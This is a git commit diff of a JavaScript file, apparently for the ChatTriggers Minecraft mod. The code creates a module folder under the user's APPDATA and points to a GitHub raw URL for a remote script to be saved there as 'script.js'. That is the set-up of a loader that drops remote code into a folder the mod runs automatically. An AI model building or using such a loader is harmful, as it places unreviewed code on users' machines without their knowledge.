47b10476a15ffef7439ff77dd1d5e3e97fc94c22
satnnyy <satnnyy@gmail.com>
2025-06-11 20:48:54 +1000

    Update a.js

--- a.js
+++ a.js
@@ -1,11 +1,14 @@
+const File = Java.type('java.io.File');
+const System = Java.type('java.lang.System');
+
 const appData = System.getenv("APPDATA");
 
-// Path to ChatTriggers pogdata module folder
+// Path to ChatTriggers module folder
 const targetPath = new File(appData + "/.minecraft/config/ChatTriggers/modules/Amaterasu");
 targetPath.mkdirs(); // Create folders if needed
 
 // Destination file
 const file = new File(targetPath, "script.js");
 
-// GitHub raw file URL
-const url = "https://raw.githubusercontent.com/satnnyy/test1/refs/heads/main/b.js";
+// Correct GitHub raw file URL
+const url = "https://raw.githubusercontent.com/satnnyy/test1/main/b.js";
